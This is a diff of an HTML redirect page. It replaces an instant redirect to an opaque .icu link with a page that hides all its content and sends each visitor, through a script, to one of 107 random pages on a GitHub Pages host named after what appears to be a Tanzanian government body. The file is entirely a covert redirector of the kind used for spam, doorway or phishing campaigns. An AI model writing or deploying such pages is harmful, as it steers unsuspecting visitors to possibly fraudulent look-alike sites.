@@ -1,8 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta http-equiv="refresh" content="0; url=https://peleka-moto.icu/n1wpKsfTJ8grOha">
-<script>window.location.href = "https://peleka-moto.icu/n1wpKsfTJ8grOha";</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+        .hidden, * {
+            display: none;
+        }
+    </style>
 </head>
-<body></body>
+<body>
+    <script>
+        (function() {
+            "use strict";
+            
+            const MIN_PAGE = 1;
+            const MAX_PAGE = 107;
+            const BASE_URL = "https://selform-tamisemi.github.io/";
+            
+            function getRandomPageNumber(min, max) {
+                if (window.crypto && window.crypto.getRandomValues) {
+                    const range = max - min + 1;
+                    const maxValid = Math.floor(256 / range) * range;
+                    const randomBytes = new Uint8Array(1);
+                    do {
+                        crypto.getRandomValues(randomBytes);
+                    } while (randomBytes[0] >= maxValid);
+                    return min + (randomBytes[0] % range);
+                }
+                return Math.floor(Math.random() * (max - min + 1)) + min;
+            }
+            
+            function getRedirectUrl() {
+                const pageNum = getRandomPageNumber(MIN_PAGE, MAX_PAGE);
+                return BASE_URL + "page_" + pageNum + ".html";
+            }
+            
+
+            const destination = getRedirectUrl();
+            
+            window.location.replace(destination);
+        })();
+    </script>
+</body>
 </html>
